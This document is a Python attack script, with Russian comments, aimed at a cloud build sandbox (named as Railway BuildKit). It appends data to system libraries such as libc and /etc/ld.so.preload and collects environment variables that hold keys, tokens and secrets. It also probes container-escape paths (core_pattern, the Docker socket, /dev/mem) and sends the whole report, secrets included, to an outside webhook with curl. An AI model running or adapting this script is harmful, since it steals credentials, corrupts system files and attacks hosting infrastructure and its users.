import os
import subprocess
import json
import time

# --- КОНФИГУРАЦИЯ ---
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
REPORT = {
    "VULN_TYPE": "CRITICAL_INFRA_TAKEOVER",
    "TARGET": "railway_buildkit_sandbox",
    "FINDINGS": {},
    "ESCAPE_ATTEMPTS": {}
}

def log_step(name, status):
    REPORT["FINDINGS"][name] = status
    print(f"[*] {name}: {status}")

def run_pwn():
    # 1. ЗАХВАТ ФАЙЛОВОЙ СИСТЕМЫ (Mass Hijack)
    # Проверяем возможность записи в критические либы
    libs_to_pwn = [
        "/lib/x86_64-linux-gnu/libc.so.6",
        "/lib/x86_64-linux-gnu/libselinux.so.1",
        "/etc/ld.so.preload"
    ]
    pwned_libs = []
    for lib in libs_to_pwn:
        try:
            if os.path.exists(lib):
                with open(lib, "ab") as f:
                    f.write(b"\n/* LUMOS_WAS_HERE */\n")
                pwned_libs.append(lib)
        except Exception as e:
            continue
    log_step("SYSTEM_LIBS_COMPROMISED", pwned_libs)

    # 2. СБОР СЕКРЕТОВ (Environment Sniffing)
    # Вытаскиваем токены текущего процесса
    secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ["KEY", "TOKEN", "SECRET"])}
    log_step("EXFILTRATED_ENV_SECRETS", secrets)

    # 3. ПОПЫТКА ПОБЕГА (Container Escape / Host Takeover)
    
    # Вектор А: Core Pattern (Самый надежный способ выхода на хост при root)
    try:
        if os.access("/proc/sys/kernel/core_pattern", os.W_OK):
            REPORT["ESCAPE_ATTEMPTS"]["core_pattern"] = "WRITABLE_CRITICAL_P0"
            # Мы могли бы прописать сюда пайп в наш скрипт на хосте
        else:
            REPORT["ESCAPE_ATTEMPTS"]["core_pattern"] = "READ_ONLY"
    except:
        REPORT["ESCAPE_ATTEMPTS"]["core_pattern"] = "ACCESS_DENIED"

    # Вектор Б: Доступ к Docker Socket (если проброшен)
    if os.path.exists("/var/run/docker.sock"):
        REPORT["ESCAPE_ATTEMPTS"]["docker_socket"] = "FOUND_CRITICAL_P0"
    else:
        REPORT["ESCAPE_ATTEMPTS"]["docker_socket"] = "NOT_FOUND"

    # Вектор В: Проверка привилегированного режима через устройства
    if os.path.exists("/dev/mem"):
        REPORT["ESCAPE_ATTEMPTS"]["dev_mem_access"] = "FOUND_CRITICAL_P0"
    else:
        REPORT["ESCAPE_ATTEMPTS"]["dev_mem_access"] = "NOT_FOUND"

    # 4. ФИНАЛЬНЫЙ СИГНАЛ
    REPORT["TIMESTAMP"] = time.ctime()
    REPORT["HOSTNAME"] = os.uname().nodename
    REPORT["UID"] = os.getuid()

    try:
        res = subprocess.run([
            'curl', '-s', '-X', 'POST', 
            '-H', 'Content-Type: application/json', 
            '-d', json.dumps(REPORT), 
            WEBHOOK_URL
        ], capture_output=True)
        print("[+++] FINAL EXPLOTATION REPORT SENT TO HOOK.")
    except Exception as e:
        print(f"[-] Failed to send report: {e}")

if __name__ == "__main__":
    run_pwn()
